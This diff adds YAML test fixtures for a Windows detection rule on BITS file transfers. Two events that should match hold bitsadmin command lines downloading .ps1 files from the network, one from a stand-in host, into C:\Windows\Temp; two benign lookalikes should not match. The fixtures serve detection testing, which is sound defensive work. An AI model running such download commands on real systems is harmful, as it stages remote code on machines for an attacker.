@@ -1,0 +1,15 @@
+# Hand-written fixtures (the converter does not generate them); values are invented.
+match:
+  - desc: "bitsadmin /transfer downloads a file (ART T1197 #1)"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 8261, "ppid": 4000, "exe": "C:\\Windows\\System32\\bitsadmin.exe", "name": "bitsadmin.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Windows\\Temp\\bitsadmin1_flag.ps1", "args": ["bitsadmin.exe", "/transfer", "/Download", "/priority", "Foreground", "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md", "C:\\Windows\\Temp\\bitsadmin1_flag.ps1"], "original_name": "bitsadmin.exe", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+  - desc: "bitsadmin /addfile with an http URL (ART T1197 #3)"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 8262, "ppid": 4000, "exe": "C:\\Windows\\System32\\bitsadmin.exe", "name": "bitsadmin.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "bitsadmin.exe /addfile AtomicBITS https://example.invalid/a.ps1 C:\\Windows\\Temp\\a.ps1", "args": ["bitsadmin.exe", "/addfile", "AtomicBITS", "https://example.invalid/a.ps1", "C:\\Windows\\Temp\\a.ps1"], "original_name": "bitsadmin.exe", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+nomatch:
+  - desc: "benign lookalike - bitsadmin /list"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 8271, "ppid": 4000, "exe": "C:\\Windows\\System32\\bitsadmin.exe", "name": "bitsadmin.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "bitsadmin.exe /list /allusers", "args": ["bitsadmin.exe", "/list", "/allusers"], "original_name": "bitsadmin.exe", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+  - desc: "bitsadmin /create without a URL"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 8272, "ppid": 4000, "exe": "C:\\Windows\\System32\\bitsadmin.exe", "name": "bitsadmin.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "bitsadmin.exe /create /download BackupJob", "args": ["bitsadmin.exe", "/create", "/download", "BackupJob"], "original_name": "bitsadmin.exe", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
